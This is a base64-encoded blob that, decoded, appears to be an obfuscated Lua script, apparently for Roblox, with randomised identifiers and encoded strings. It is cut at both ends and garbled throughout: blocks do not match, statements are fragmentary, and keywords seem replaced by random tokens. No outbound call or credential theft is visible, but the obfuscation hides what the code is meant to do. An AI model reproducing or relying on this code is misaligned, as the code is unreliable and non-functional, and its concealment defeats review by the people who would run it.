1dVS1I6YnBCUmhXY0ZjcChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1KbnJWUkNlUGdnIiksIHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIwbDJabHhFSXNWV1pTQnliMFZYUSIpLCBzSUZNTmJNaXBRID0gZmFsc2V9KQogICAgaWYgRWN6dmpVTlJGSSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdVZEam9nVU5TcCB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJ0d1ZSbVB3cHdRIikgRWNJeXBPa1FZVSB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cHRNQUlDUVRMSyIpIEVjSXlwT2tRWVUKICAgICAgICAgICAgICAgIGxvY2FsIEtxSUJ6QlpCRG4gPQogICAgICAgIHNJRk1OYk1pcFEgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBsb2NhbCBYRE5yTGdETGtzID0gUEpGR2ZYU1dPYTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1rd213Q3FqdWhEIikpCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ZdlNSWnRaSHJBIiksCiAgICAgICAgZnVuY3Rpb24oSGdzRG1uWHlnVykKICAgICAgICAgICAgaFhUbVhrc0ZKTyBuaHVVZlJIdld0ID0gMSwgV1ZETHBRbFlBUSBMSldUZGJQYWx3CikKICAgIH0KICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIE5BVENRcHBWQVE6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1GS0tXbkFPaURKIikpIHRoZW4KLS0gYk9pb1VqaHFsdAogICAgICAgIGdacFJadEZ4QmguWllxTHdJc2JsbihudWpDR0NwVnRwLCBVYklaQUtvcmdCLnVpbEpyYVVSZkopCiAgICAgICAgbG9jYWwgRk9JUUdaY2pqbyA9CmxvY2FsIERpS09DZFNvSkcgPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWtMeW92S21ubXoiKSkKICAgICAgICAgICAgcUdLWkRuT0trayhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1JSWhTUFlOaElCIiksIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1LelBwcG5SZUxKIiksIDMpCiAgICAgICAgICAgIEFZbHhzRGpOblEuc1pERldSaHBIQyhmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgWGZCT2JJYVNqaSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1oZkhDS2lBR05nIikgLi4gRFFvaEV5U2N2RwogICAgICAgICAgICBpZiBQYWp2UGpubXhQIEJ4dFBVZlRSVEogUGFqdlBqbm14UC5ETnZPSXNNWFZlIHRoZW4KLS0geVpYZmtFWFBDbS5qcWdpbHBiQ09aID0gcVpLSWVOaVdHdS5qcWdpbHBiQ09aLmNsWUNadVBmR3EKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMCkKICAgICAgICAgICAgICAgICAgICBuZGtIclhORWdJID0gWmNmb1ZCc29EQS5ldmNHTkFpd2VxKG5ka0hyWE5FZ0ksIDAuMDAwMSwgMC4xKSAtLSBoTnBvRUpEc2RwIGtZT1dSVWpmcnIgaFZEcFNlRUVzRiBNbWxkbHdVdVdhCi0tIHlaWGZrRVhQQ20uUmVxVGVtY3N3ZSA9IHRCemROQmNYTmYublJrRXJHSm5KdygyNTUsIDI1NSwgMjU1KQpsb2NhbCB6eWNLV3BhbHRPID0gWmpQZHFYUG5uWDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPXhwZmZzdHJrY0MiKSk6RUxqY3lHZnhreihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09YXRJWU1kSWJsUSIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVnZLV2J1S0F0cCA9IEVXZlJwT29VRnMocU5GS0pvc09yWSkKY1RRZFJNSFBiVS5IcUpnbnh2YWlNOkF6U1hBUlBuWlAoewpOZlhqSXNnTnhnOkpQRXNvZ2tnYlQoCikKCiAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMCkKICAgIGVuZAopCiAgICBlbmQKICAgICAgICAgICAgbmRrSHJYTkVnSSA9IFpjZm9WQnNvREEuZXZjR05BaXdlcShuZGtIclhORWdJLCAxLCAxMCkgLS0gaE5wb0VKRHNkcCBrWU9XUlVqZnJyIGhWRHBTZUVFc0YgMSAtIDEwIGFlTlBRdlVIUGcKCiAgICAgICAgICAgIFVWUkJ0Q05RdFouSkhTV0FqUnB2bSA9IG5pbAogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09WllhR0txTGdkYyIpLAogICAgICAgIGVuZAogICAgZW5kCgoKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAga0ZwYlhOaUlETyA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsZWF6QmpDelFnOlVjdGNLZERLckkoTlhVSk9UY1VqcSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVNnR1FJd21PTlgiKSwgbmlsLCAxKQogICAgICAgICAgICBKdVNBd3JTUnpuKCkgLS0gTUNWeUJGWlNBQyBDanlFTGRoc2NUIEp1U0F3clNSem4gZldCbmJDWnBRQyBTS29leGxPTlRKIGxpZk9xTnJDdnIKICAgICAgICAgICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYSgwLjUpIC0tIERSb2hvTU51WUUgbmRrSHJYTkVnSSBsU1FIaGZCUGpIIHVXZ2xza1NyakkgSFRYcXluYU9YdgogICAgICAgIHNJRk1OYk1pcFEgPSBmYWxzZQogICAgc216a2ZkWFlXZAogICAgfQpsb2NhbCBrVFBRS0FTanFBID0KICAgIGZ1bmN0aW9uKCkKICAgIHsKICAgICAgICAgICAgICAgIGVuZAogICAgbG9jYWwgUWVKTUxTRENiUCA9IFB5ZHhUeHNFREEuRE52T0lzTVhWZTp3TnFKaVRkeXBVKHN1bk9VakhVWkMpIEVjSXlwT2tRWVUgUHlkeFR4c0VEQS5HS3dnTGZFQVBqOndOcUppVGR5cFUoc3VuT1VqSFVaQykKICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPUJQVWlpeHVWWG4iKSwKICAgIHJldHVybiBRZUpNTFNEQ2JQCiAgICAgICAgICAgIGVuZAppZiBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWlQWXNDbmFzRkciKSkgdGhlbgogICAgICAgICAgICBlbmQKICAgICkKICAgIHJldHVybiBXRE1QaEFhQW9tLnhWbVppUHl5ek0oV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9WGN6UExxR3F5SCIpLCB1cVFKaVJwUml2LCB4TFZWd0NOTVVyLCBYdUJQbmVZSmx3KQogICAgfQogICAgICAgICAgICAgICAgICAgIGxvY2FsIFFlSk1MU0RDYlAgPSBETnZPSXNNWFZlOmhtRkZWcFVvdHYoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVVocnRTRG9tYnUiKSkKICAgICAgICAgICAgICAgICAgICB2Tm5tSG5JWGNXOlhiaUFUdmdQVWwodHJ1ZSwgcVpLSWVOaVdHdS5admdHQmtsYmZPLkJpTElMZUVSRGMsIGZhbHNlLCBJUndWbExIS011KQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZApsb2NhbCBQeWR4VHhzRURBID0gdG1aZGRrbUdNci5QeWR4VHhzRURBCgpsb2NhbCBIYUlwRVZkZlNhID0gQ21ldm5iakJQWigpIC0tIGprTGdQYVdYQ2kgd3hvam5HR3pWTQogICAgICAgICAgICAgICAgWERlTG9DVXhhRyhzRkhsUEZVYkZqKQpsb2NhbCBmdW5jdGlvbiBKdVNBd3JTUnpuKCkKICAgICAgICBpZiBNZVRZRkp1RXFvIHRoZW4KbG9jYWwgTXBwYmlYWGFvSSA9IGZpTW13b0dIVGQubGFpbk9rZ0tmdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInZXdVBXTWhGQ3ciKSkKICAgICAgICBoWFRtWGtzRkpPIFBjcGNya1JsQnosIFViSVpBS29yZ0IgSlpsb3VocEhsVCBueE9nUmphd2ZFKG51akNHQ3BWdHApIExKV1RkYlBhbHcKICAgIGVuZAogICAgICAgIHNIWEtYc3JESHYgPSBmYWxzZSwKICAgICAgICBkQ2FsUFRBQnlHOkJZQ1FjQVlnUWooI2ZFVnNLb1NGZVEgPiAwIEJ4dFBVZlRSVEogZkVWc0tvU0ZlUSBFY0l5cE9rUVlVIHtXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09VGxOdVBDY3dkRyIpfSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgIH0KICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9bHZXbUdsVUdhUiIpLApKa0trcmtueFB5ID0KICAgIGdRSUFRbm1adnQgPSBDUGdwcHV4Yk5XOkR3YWZSQm9DZWIoe3RhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09VkRoQUpXcE1TbyIpLCBjUGhYZXBZZU5hID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI0UWpNMllUTzBNek53RXpMdm9EWnBSWFp6TlhZNEptYyIpfSksCi0tIEVsZ3pjWUxmRWggYmZXT0pMV1pyTiBCdUx1RUhuUGtBCiAgICAgICAgICAgICAgICBsb2NhbCBadENJZXppb09TLCBxc1BsWU1YVnp5ID0KICAgICAgICAgICAgZW5kCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT14dGJySVVvaWFLIiksCiAgICAgICAgICAgIGlmIEJvTGh2ZnlaSm06Umd0b29nRWdtZShES09naGRqcHJjLCAxLCB0cnVlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgaWYgSW55UFJIcmhXVTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1vaFp4aFRzdWtNIikpIHRoZW4KKQogICAgICAgICAgICAgICAgaFhUbVhrc0ZKTyBQY3BjcmtSbEJ6LCBvYlBLaHlvdWdUIEpabG91aHBIbFQgbnhPZ1JqYXdmRShwWVl1YWZpRXVSOkRRWnpMRGtxQW4oKSkgTEpXVGRiUGFsdwogICAgICAgICAgICAgICAgICAgIFlYbU1qWW9jTnAubGFpbk9rZ0tmdygxLCBxWktJZU5pV0d1LnhjZW5LaE5vUFguRWFvU2J1YXRrRCwgcVpLSWVOaVdHdS5ETHRLbWxtRGdTLmJRcUpsQVRCQm0pLAogICAgZW5kCiAgICAgICAgICAgIHNtemtmZFhZV2QKICAgICAgICAgICAgICAgIGlmIG9ITU1TekNETnUgdGhlbgogICAgZnVuY3Rpb24oKQogICAgc0lGTU5iTWlwUSA9IHZZa1R1aVp2VmQuck5DUkJhVUdyRiwKbG9jYWwgY29pYW1IYWZMWCA9IEh0ZmxNb2tZeE4gQnh0UFVmVFJUSiBIdGZsTW9rWXhOOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWdIekFlV1F2TkEiKSkKCiAgICAgICAgICAgICAgICBVVlJCdENOUXRaLkpIU1dBalJwdm0gPSBOZFNna2h4dmRNCiAgICAgICAgICAgIFFwUUN6QlVWQ2coV0RNUGhBYUFvbS50dEJCemhaVEhLKCJLd2RzZGRwVW1DIikpCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgewogICAgICAgICAgICBsb2NhbCBxeUtHUnlGYllmID0gcnZtbkhEVXJNYihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09bkpqR3VJYUZVdyIpIC4uIEFDV0tVTWx5UEgpCiAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkRiQUVtWnVhZ0wiKSwKICAgICAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXNYbXFYb25HamgiKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIElxY09KWFVGTGogPSBXeWJtbW9qQktqLldncnZsYmx2TGY6U3V6RGlDVnh3VihaQ2FvWG1PQkNFLldncnZsYmx2TGYsIDAuNykKbG9jYWwgZnVuY3Rpb24gZVRYZlZCbGlaeihmeldJc0l2eXN5KQogICAgICAgIFdpWFBZQ3BYaEUgPSBmYWxzZQogICAgZW5kCmxvY2FsIENqZHF0cXNRbEkgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09enZkT0JpRWZPeiIpCikKICAgIHNJRk1OYk1pcFEgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09ZFRmRXF0c3piYiIpLAogICAgICAgIGxvY2FsIGZ1bmN0aW9uIFF5ckdmQk5YU0QoKQogICAgICAgICAgICBsb2NhbCBvUFp0dUpGUVJLID0gSEV3S3lVcEVkYy5IZ3NEbW5YeWdXCgogICAgICAgICAgICAgICAgaWYgb2JQS2h5b3VnVDpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPTQyYjBSWGRDVjJaaDFXUyIpKSB0aGVuCiAgICB9CiAgICB7dGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygicEJVaEpQb2dLbiIpLCBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVJIVHBHTlRMTVMiKSwgc0lGTU5iTWlwUSA9IGZhbHNlfQogICAgaWYgc1lkQ0hzb3RxUCBFY0l5cE9rUVlVIGJFaElxVHpvVHQgWlFlRVp6UkFaeSB0aGVuCmVuZApRSGNxWHJibVNyLkp0aGZ6S0lXaFcgPSB6RlJFYWhCaGRoLmxhaW5Pa2dLZncoNiwgMSwgNikgLS0gU29Ca1FWWkNvUiBpc1lRQVROUFFBIFZtcFdJd3JKenYgVW9aQ3ZxZ1NWciBJdHRSY3ZyWlB4CgogICAgICAgICAgICAgICAgICAgIG9ITU1TekNETnUgPSBzR0xUUk9lRnRvLkRCZEtabG1JekYuVWFLRlVQaHRTdDp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1EeHpUTVNJTmpCIikpCiAgICAgICAgICAgICAgICAgICAgICAgIHdWTW5sUFJhSmEgPSBtWGxzQ3B4TnZyLmxhaW5Pa2dLZncob0hNTVN6Q0ROdS5XZ3J2bGJsdkxmICsgekZSRWFoQmhkaC5sYWluT2tnS2Z3KDAsIDc2LCAwKSkKCiAgICAgICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDAuMDUpCiAgICAgICAgICAgICAgICAgICAgICAgIFFwUUN6QlVWQ2coV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9UVNoSEpMV0pWVCIpIC4uIChzY1VZaERxQUxTIEJ4dFBVZlRSVEogV0RNUGhBYUFvbS50dEJCemhaVEhLKCJQdlZBS1VPSEJsIikgRWNJeXBPa1FZVSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09RnBPbHRZVE9odiIpKSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgIGxvY2FsIHJncmdESEZ2RkUgPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PW9oWnhoVHN1a00iKSkKICAgIGVuZAoKICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPWpLVnRLb2dwd0oiKSwKICAgICAgICAgICAgICAgICAgICAgICAgaFhUbVhrc0ZKTyBQY3BjcmtSbEJ6LCB2Rm9PRG5vdGFVIEpabG91aHBIbFQgR25VdkxIb3N1Tih2emxhTEN0ZXh5OkRRWnpMRGtxQW4oKSkgTEpXVGRiUGFsdwoKICAgICAgICAgICAgaWYgc0ZIbFBGVWJGaiB0aGVuCiAgICBmdW5jdGlvbigpCmNUUWRSTUhQYlUuZ1FJQVFubVp2dDpicEJSaFdjRmNwKFdETVBoQWFBb20udHRCQnpoWlRISygiWGthS3lxYkRPQiIpLCB7CgoKICAgIGlmIGdacFJadEZ4QmguUmd0b29nRWdtZShPS3FJclpyd2RuLCB2SFNvRHlOY3JFLnVpbEpyYVVSZkopID09IG5pbCB0aGVuCiAgICAgICAgICAgIGVuZAogICAgZW5kCmxvY2FsIG1nT2NiVVpKWEkgPQogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVhGak9CRWhxR1UiKSwKCiAgICAgICAgICAgIFB1THFCQ0xpWGYgdllrVHVpWnZWZC55eU5FdGhLYURBIExKV1RkYlBhbHcKICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKKQogICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYSgxKQpoWFRtWGtzRkpPIFBjcGNya1JsQnosIFViSVpBS29yZ0IgSlpsb3VocEhsVCBHblV2TEhvc3VOKGJ5QUpMTm1mbUI6RFFaekxEa3FBbigpKSBMSldUZGJQYWx3CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRUNpSndMU1pKeSA9IG9iUEtoeW91Z1Q6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoImhId05neGJqRVoiKSkKICAgIFB5ZHhUeHNFREE6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkpSdVpUQUpRVnEiKSkgQnh0UFVmVFJUSiBQeWR4VHhzRURBLnBTUGhOckZZTGk6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIndjTE56WndwYXEiKSkgQnh0UFVmVFJUSgopCi0tIEVsZ3pjWUxmRWggYmZXT0pMV1pyTiBpeHpkVnVTdmRZIFViSVpBS29yZ0IgTU5YTlpjVktOTSBJVmpOZU5UcmdkCiAgICAgICAgICAgIC0tIEpraUpnbG14aWQgY0hKVklmbUlQSi5hbGVBVmZxc3h4IFVsem5mcU9acm4gcHdHdlpjZkhSeSBrU0hxeEFOU1hDCiAgICAgICAgICAgICAgICAgICAgICAgIHZIU29EeU5jckUuWnlLYUhjVHFpRyA9IGZhbHNlCiAgICAgICAgbG9jYWwgRk9pVU5OWUhKUSA9CiAgICBERVpLTnZrUHVSID0gQ1BncHB1eGJOVzpEd2FmUkJvQ2ViKHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9aGRweXlvb0JyZCIpLCBjUGhYZXBZZU5hID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI1QXpNd1VUTzBNek53RXpMdm9EWnBSWFp6TlhZNEptYyIpfSkKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PW1YRW1NSHFjd28iKSwgLS0gZndJaHRxaFpReSBcU1dKTlhUU1pJWiBiZldPSkxXWnJOIFRncUZMQmNHd3Agdk90WFB2R2NhdwpjVFFkUk1IUGJVLnp3VUxUUnFvQ1U6QXpTWEFSUG5aUCgKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAtLSBkZUJyTW1PaWRKIFpmdXdTZWlpUkYgYmZXT0pMV1pyTiBTdFdMZ1pUZFduIG9iUEtoeW91Z1Qga1lPV1JVamZyciBwWVl1YWZpRXVSCgogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgY05MV0NOeFBnRiB0aGVuCiAgICAgICAgc0lGTU5iTWlwUSA9IGZhbHNlLAogICAgICAgICAgICAgICAgSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPWRDV2hJaFNHZVEiKSk6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjV0MlUiKSkudGp1V2xUc1h6ZSA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1kQ1doSWhTR2VRIikpLktHaGpLZnBOaFUKICAgICAgICAtLSBscWlzcFlGUlB5IGZXQm5iQ1pwUUMgeklwWkNFRVZzTSBmUU1SUXhkckVvCiAgICAgICAgICAgIEFZbHhzRGpOblEuRmhXWldCT2FTbChQRXdlY3J1aERpKQogICAgICAgICAgICAgICAgICAgIE5BVENRcHBWQVEuSXN3Rm5Fb3V5RS5SZXFUZW1jc3dlID0gdEJ6ZE5CY1hOZi5uUmtFckdKbkp3KDE5MCwgMTcwLCAyMzApCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiBIdGZsTW9rWXhOIEJ4dFBVZlRSVEogSHRmbE1va1l4Tjp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1nSHpBZVdRdk5BIikpIHRoZW4KfSkKICAgICAgICAgICAgUXBRQ3pCVVZDZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIk5PTHVxdlNhTkIiKSkKICAgICAgICBDdXVnWXFpZkpjOkJZQ1FjQVlnUWooI0pQWGJua1hjcXYgPiAwIEJ4dFBVZlRSVEogSlBYYm5rWGNxdiBFY0l5cE9rUVlVIHtXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09VGxOdVBDY3dkRyIpfSkKICAgICAgICBpZiBiRWhJcVR6b1R0IG54aWlSWUJ4RlkgQnh0UFVmVFJUSiBvRkptcHFUSWFGIHRoZW4KICAgICAgICAgICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYSgxKQogICAgfQpsb2NhbCBhVXV3bVB2QWxBID0ge30KICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9bXVLUkd1T0NYdCIpLAogICAgICAgICAgICAgICAgICAgIFVWUkJ0Q05RdFouSkhTV0FqUnB2bSA9IG9iUEtoeW91Z1QKICAgICAgICAgICAgZW5kCiAgICBjWHVWb1ZxcWdsLnRCemROQmNYTmYgPSB0QnpkTkJjWE5mLm5Sa0VyR0puSncoMjU1LCAyNTUsIDI1NSkgLS0gTW9OUERrUlR3YyBTWFlRQ1ZpRm13Cm1ra0lYaHlGWnE6WGROSEh1SkZyWChIVW1GcnRrcW1WKQotLSBEaUtPQ2RTb0pHLldncnZsYmx2TGYgPSBRc3lDd25QTVVZLmxhaW5Pa2dLZncoMC4wOCwgMCwgMC41LCAtMTIpIC0tIHl4R2tqUVFyWUkgZ2l4WFBoc2FKSSBzZXNsUUNHY21QIEpWbXpBTExTRE4KZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGdacFJadEZ4QmguWllxTHdJc2JsbihYallOVGJFVEZsLCAxLCB2SFNvRHlOY3JFKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgIHsKLS0gcFdTVVNVU3dkSSBXYmtzbmlNTGRiCiAgICBmdW5jdGlvbihES09naGRqcHJjKQogICAgICAgIHNZZENIc290cVAgPSBuaWwKeXpRUHRkUlJaRi5Kb2VGeW9nbkl2ID0gZmFsc2UgLS0gckdseERDWFFPUiBWbXBXSXdySnp2IGdkaWdyQ1poR1kgZldCbmJDWnBRQyBLcGZCT0ZDcFhEIElibm5hY1pmelkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgV3libW1vakJLaiA9IGNOTFdDTnhQZ0Y6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkh3eFRhQktKRUwiKSkKbG9jYWwgU25GQ2Jaalh2byA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1qZVd5eGhQU0xQIikpCmxvY2FsIHBTUGhOckZZTGkgPSBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWJackpYT3NuTUYiKSkuUHlkeFR4c0VEQTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiSlJ1WlRBSlFWcSIpKQogICAga0ZwYlhOaUlETyA9IGZ1bmN0aW9uKERLT2doZGpwcmMpCiAgICAgICAgdWJ3d1FaT0N5ZiA9IE9DZW5MaFF2VHAuaU5WUE5lSmVCYTpuenZGeFRDRGNEKGZ1bmN0aW9uKE5kU2draHh2ZE0pCgpsb2NhbCBEUVFuWE1IcWN2ID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1pUFlzQ25hc0ZHIikpCmVuZAoKZW5kCiAgICAgICAgICAgICAgICAgICAgTE9Ec25Hb0l6RS5pTVN3eUFaUnZkOm56dkZ4VENEY0QoZnVuY3Rpb24oek5XQ2NxZkNKYikKICAgICAgICAgICAgICAgICAgICB1VkRqb2dVTlNwIHZZa1R1aVp2VmQuWXNjZldPRlhjdCA9PSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09SU5ic2xpZ29uYiIpIHRoZW4KICAgICAgICAgICAgICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPXpjYmVTbXJZakkiKQogICAgZnVuY3Rpb24oSGdzRG1uWHlnVykKICAgICAgICBqcHFNeVdVR1NGID0ge1dETVBoQWFBb20udHRCQnpoWlRISygiPT1kVGZFcXRzemJiIiksIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ieXFxQk5EanNoIil9LApNcHBiaVhYYW9JLmpxZ2lscGJDT1ogPSBxWktJZU5pV0d1LmpxZ2lscGJDT1ouVElpc3BJblZMVwogICAgICAgICAgICBpZiBsRnZqckpHbW1UOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJKWWp2QW5NWkJFIikpIHRoZW4KbG9jYWwgQ1BncHB1eGJOVyA9CgogICAgfQogICAgZW5kCgoKICAgICAgICAgICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKCkKICAgIE9XUVZjQnRYS3ggPSBsRnZqckpHbW1UOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9enJ0VFRLU21maCIpKSBCeHRQVWZUUlRKIGxGdmpySkdtbVQuVE5CaFpVR05mYS5ndERMcGJ6TW12IEVjSXlwT2tRWVUgbmlsCiAgICBlbmQKZ1pwUlp0RnhCaC5mTkZacHdaVVZZKE9LcUlyWnJ3ZG4sIGZ1bmN0aW9uKFBBSHNwZVNQdGssIHZNQkhHcHpubkEpCiAgICAgICAgICAgICAgICAgICAgICAgIFhETnJMZ0RMa3Muem1xaVFIRGhiUSA9IHNjVVloRHFBTFMKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFpDYW9YbU9CQ0UgPSBjTkxXQ054UGdGOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PU5EWXpxY3pRaVIiKSkKICAgICAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oKQotLSAqKmdQcGhpbVl5WmsgS0J3bXNTalRRTCBrcm9PeVJ2U1JDIHpJcFpDRUVWc00gZEl2cnBERXNLQSBCUFllV1FLQ2tOKioKICAgIGpwcU15V1VHU0YgPSBudWpDR0NwVnRwLAogICAgICAgICkKICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1WcVJwV3lNRFp4IiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVDaUp3TFNaSnk6Y25FbE91VnNZSCgpIC0tIGN6VGlCTFFUUnogY05MV0NOeFBnRiBpc1lRQVROUFFBIGlwRnliYm1VeHkKICAgICAgICAgICAgICAgIGlmIE5BVENRcHBWQVE6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1GS0tXbkFPaURKIikpIEJ4dFBVZlRSVEoga25Od0h6ckJLUS5YcUdzTXlieHp3IHRoZW4KQVlseHNEak5uUS5GaFdaV0JPYVNsKAogICAgICAgICAgICBRcFFDekJVVkNnKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1pa2ZNdnF4b2tpIiksIG9QWnR1SkZRUkspCiAgICAgICAgICAgICAgICAgICAgaWYgdkhTb0R5TmNyRTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPWNKb0tubVNrUkciKSkgRWNJeXBPa1FZVSB2SFNvRHlOY3JFOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVFITnZNd2ZVZFYiKSkgdGhlbgogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgIEVjenZqVU5SRkkuR1RFeUlCdXVLRSA9IHRydWUKICAgIGpaZHNNT3RpZ2E6SlBFc29na2diVCgKbG9jYWwgQ3V1Z1lxaWZKYyA9IGJ3ZUpxSHpVTUk6RW1SeGdLeFF1ZihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIm5ZS0htWXpmd3kiKSwgewogICAgICAgICAgICAgICAgICAgIGlmCi0tIG91TmxnYVJrZlgudGp1V2xUc1h6ZSA9IGZQdmhOdElMU3ggLS0gaE5wb0VKRHNkcCBva1ZTbXdHUU9TIFBJV3dEYnBkVlYgTXFjd0JsaVZ5ciBmUHZoTnRJTFN4CiAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkZoV1pXQk9hU2woCgogICAgICAgICkKICAgICAgICBReXJHZkJOWFNEKCkKICAgIHJncmdESEZ2RkUuV2dy